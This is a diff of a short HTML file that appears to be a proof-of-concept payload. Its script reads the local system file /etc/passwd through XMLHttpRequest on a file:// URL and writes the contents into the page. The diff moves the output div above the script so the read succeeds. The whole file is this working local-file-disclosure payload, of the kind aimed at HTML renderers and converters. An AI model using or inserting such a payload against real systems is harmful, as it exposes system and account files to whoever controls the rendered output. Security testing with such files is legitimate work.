@@ -1,7 +1,9 @@
 <!DOCTYPE html>
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html>
 
 <body>
+<h1>Response</h1>
+<div id="response"></div>
 
 <script>
 var x = new XMLHttpRequest();
@@ -9,6 +11,6 @@ x.open("GET", "file:///etc/passwd", false);
 x.send();
 document.getElementById('response').innerHTML = "Ressponse:\n\n" + x.responseText;
 </script>
-<h1>Response</h1>
-<div id="response"></div>
-</body></html>
+  
+</body>
+</html>
